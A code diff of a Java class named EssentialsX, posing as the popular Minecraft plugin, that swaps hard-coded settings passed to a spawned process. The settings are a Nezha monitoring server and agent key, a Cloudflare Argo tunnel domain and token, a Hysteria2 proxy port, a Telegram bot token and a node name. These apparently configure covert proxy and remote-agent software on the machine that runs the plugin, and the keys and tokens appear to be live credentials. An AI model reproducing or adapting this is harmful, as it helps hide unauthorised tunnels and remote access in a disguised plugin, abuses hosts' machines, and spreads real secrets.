@@ -73,16 +73,16 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "69991255-d739-4513-bc11-9ef45a637965");
+        env.put("UUID", "c3cabaaa-689d-4642-b4ec-79acef29f7c6");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "144.22.159.118:8008");
+        env.put("NEZHA_SERVER", "bo66.pp.ua:8008");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "GTmVnjnxL0bC41DDvN7UzMNqf6jAK9TM");
+        env.put("NEZHA_KEY", "yZAEKJz2Skx8a1ovsIFNVG7hd81n2BpD");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "grave.xu88.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiN2Q3ODRiNzktZTBlNS00OTU4LTg2NGUtNTcyYmZlMjliNWRmIiwicyI6IlpHVXlORGhqT1dFdE56Tm1aQzAwTmpGaExUZ3dOVGN0WW1NelptTTNObVEwTWpNeSJ9");
+        env.put("ARGO_DOMAIN", "teoheberg.bo66.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiNWZmNDg3ZmItYTEwOC00ZjQ3LTk3ODctZmU5YWQwMWQxYjdkIiwicyI6Ik5HVmlOelV6WXpBdE9EaGtOeTAwTXpNMExXSTJNREV0TjJJNVlUWXhOV1V6T1dZMiJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "40030");
+        env.put("HY2_PORT", "26496");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
         env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "witchly-DE");
+        env.put("NAME", "godlike-us");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
